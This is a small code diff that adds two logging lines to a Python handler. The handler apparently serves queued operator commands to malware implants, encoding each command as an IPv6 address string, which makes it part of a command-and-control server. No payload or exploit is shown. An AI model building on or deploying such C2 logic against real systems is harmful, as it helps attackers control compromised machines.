@@ -211,9 +211,11 @@ def catch_all_get(path):
     try:
         operator, command = get_waiting_command(path)
         if operator and command is False:
+            logger.error("error")
             return "error"
         checkout_command(path, operator)
         command = ipv6_encoder.string_to_ipv6(command)
+        logger.info("sending command to implant")
         return command
     except Exception as e:
         logger.error(f"error: {e}")
